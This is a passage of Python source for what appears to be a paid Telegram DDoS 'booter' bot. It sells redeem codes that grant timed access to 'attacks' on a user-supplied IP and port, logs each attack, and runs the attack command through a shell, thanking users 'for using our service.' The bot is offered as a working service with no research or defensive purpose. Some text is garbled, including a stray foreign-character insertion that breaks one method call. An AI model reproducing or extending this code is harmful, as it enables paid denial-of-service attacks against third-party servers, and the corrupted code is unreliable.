        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ No attack history found for this user.*", parse_mode='Markdown')
        return
    logs_text = "*User Attack History:*\n"
    for log in attack_logs:
        local_timestamp = log['timestamp'].replace(tzinfo=timezone.utc).astimezone(LOCAL_TIMEZONE)
        formatted_time = local_timestamp.strftime('%Y-%m-%d %I:%M %p')
        logs_text += (
            f"IP: {log['ip']}\n"
            f"Port: {log['port']}\n"
            f"Duration: {log['duration']} sec\n"
            f"Time: {formatted_time}\n\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=logs_text, parse_mode='Markdown')

async def delete_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to delete attack logs!*", parse_mode='Markdown')
        return
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /delete_log <user_id>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    result = attack_logs_collection.delete_many({"user_id": target_user_id})
    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… Deleted {result.deleted_count} attack log(s) for user {target_user_id}.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ No attack history found for this user to delete.*", parse_mode='Markdown')

async def run_attack(chat_id, attack_command, context):
    try:
        process = await asyncio.create_subprocess_shell(
            attack_command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    finally:
        await context.bot.send_message(chat_id=chat_id, text="*âœ… Attack Completed! âœ…*\n*Thank you for using our service!*", parse_mode='Markdown')

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âŒ You are not authorized to generate redeem codes!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) < 1:
        await context.botçœ‹åˆ°äº†.send_message(
            chat_id=update.effective_chat.id,
            text="*âš ï¸ Usage: /gen [custom_code] <days/minutes> [max_uses]*",
            parse_mode='Markdown'
        )
        return
    max_uses = 1
    custom_code = None
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âš ï¸ Please specify time in days (d) or minutes (m).*",
            parse_mode='Markdown'
        )
        return
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day(s)"
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute(s)"
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="*âš ï¸ Please provide a valid number for max uses.*",
                parse_mode='Markdown'
            )
            return
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],
        "max_uses": max_uses,
        "redeem_count": 0
    })
    message = (
        f"âœ… Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=message,
        parse_mode='Markdown'
    )

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*âš ï¸ Usage: /redeem <code>*", parse_mode='Markdown')
        return
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*âŒ Invalid redeem code.*", parse_mode='Markdown')
        return
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*âŒ This redeem code has expired.*", parse_mode='Markdown')
        return
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*âŒ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*âŒ You have already redeemed this code.*", parse_mode='Markdown')
        return
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    await context.bot.send_message(chat_id=chat_id, text="*âœ… Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âŒ You are not authorized to delete redeem codes!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) > 0:
        specific_code = context.args[0]
        result = redeem_codes_collection.delete_one({"code": specific_code})
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*âœ… Redeem code `{specific_code}` has been deleted successfully.*",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*âš ï¸ Code `{specific_code}` not found.*",
                parse_mode='Markdown'
            )
    else:
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*âœ… Deleted {result.deleted_count} expired redeem code(s).*",
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="*âš ï¸ No expired codes found to delete.*",
                parse_mode='Markdown'
            )

async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to view redeem codes!*", parse_mode='Markdown')
        return
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ No redeem codes found.*", parse_mode='Markdown')
        return
    codes = redeem_codes_collection.find()
    message = "*ðŸŽŸï¸ Active Redeem Codes:*\n"
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        time_diff = expiry_date - current_time
        remaining_minutes = time_diff.total_seconds() // 60
        remaining_minutes = max(1, remaining_minutes)
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440
            remaining_hours = (remaining_minutes % 1440) // 60
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"
        if expiry_date > current_time:
            status = "âœ…"
        else:
            status = "âŒ"
            remaining_time = "(Expired)"
        message += f"â€¢ Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def cleanup(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to perform this action!*", parse_mode='Markdown')
        return
    current_time = datetime.now(timezone.utc)
    expired_users = users_collection.find({"expiry_date": {"$lt": current_time}})
    expired_users_list = list(expired_users)
    if len(expired_users_list) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ No expired users found.*", parse_mode='Markdown')
        return
    for user in expired_users_list:
        users_collection.delete_one({"_id": user["_id"]})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… Cleanup Complete!*\n*Removed {len(expired_users_list)} expired users.*", parse_mode='Markdown')

async def broadcast_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âŒ You are not authorized to broadcast messages!*",
            parse_mode='Markdown'
        )
        return
    if not context.args:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âš ï¸ Usage: /broadcast <message>*",
            parse_mode='Markdown'
        )
        return
    broadcast_message = ' '.join(context.args)
    users = users_collection.find({}, {"user_id": 1})
    success_count = 0
    failure_count = 0
    for user in users:
        try:
            user_id = user['user_id']
            await context.bot.send_message(
                chat_id=user_id,
                text=f"*ðŸ“¢ Broadcast Message:*\n\n{broadcast_message}",
                parse_mode='Markdown'
            )
            success_count += 1
        except Exception as e:
            print(f"Failed to send message to user {user_id}: {str(e)}")
            failure_count += 1
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=(
            f"*âœ… Broadcast completed!*\n\n"
            f"*ðŸ“¬ Successful:* {success_count}\n"
            f"*âš ï¸ Failed:* {failure_count}\n"
        ),
        parse_mode='Markdown'
    )

async def extend_expiry(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âŒ You are not authorized to extend expiry dates!*",
            parse_mode='Markdown'
        )
        return
    if len(context.args) == 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âš ï¸ Usage: /extend_expiry <user_id (optional)> <days/minutes>*",
            parse_mode='Markdown'
        )
        return
    time_input = context.args[-1]
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 86400
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 60
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*âš ï¸ Please specify time in days (d) or minutes (m).*",
            parse_mode='Markdown'
        )
        return
    new_expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)
    if len(context.args) == 1:
        users_updated = 0
        for user in users_collection.find({"expiry_date": {"$gt": datetime.now(timezone.utc)}}):
            users_collection.update_one(
                {"user_id": user['user_id']},
                {"$set": {"expiry_date": new_expiry_date}}
            )
            users_updated += 1
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*âœ… Expiry dates extended for {users_updated} active users by {time_value} {time_input[-1]}.*",
            parse_mode='Markdown'
        )
    elif len(context.args) == 2:
        target_user_id = int(context.args[0])
        user = users_collection.find_one({"user_id": target_user_id})
        if not user:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"*âŒ User {target_user_id} not found.*",
                parse_mode='Markdown'
            )
            return
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"expiry_date": new_expiry_date}}
        )
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"*âœ… Expiry date extended for user {target_user_id} by {time_value} {time_input[-1]}.*",
            parse_mode='Markdown'
        )

async def set_cooldown(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âŒ You are not authorized to set the cooldown period!*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*âš ï¸ Usage: /set_cooldown <time_in_minutes>*", parse_mode='Markdown')
        return
    try:
        cooldown_minutes = int(context.args[0])
        if cooldown_minutes <= 0:
            raise ValueError("Cooldown time must be a positive integer.")
        global COOLDOWN_PERIOD
        COOLDOWN_PERIOD = timedelta(minutes=cooldown_minutes)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âœ… Cooldown period set to {cooldown_minutes} minute(s).*", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*âš ï¸ Error: {e}*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("menu", menu))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("argument", set_argument))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("set_time", set_max_attack_time))
    application.add_handler(CommandHandler("log", view_attack_log))
    application.add_handler(CommandHandler("delete_log", delete_attack_log))
    application.add_handler(CommandHandler("extend_expiry", extend_expiry))
    application.add_handler(CommandHandler("broadcast", broadcast_message))
    application.add_handler(CommandHandler("set_cooldown", set_cooldown))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CallbackQueryHandler(callback_query_handler))
    application.run_polling()

if __name__ == '__main__':
    main()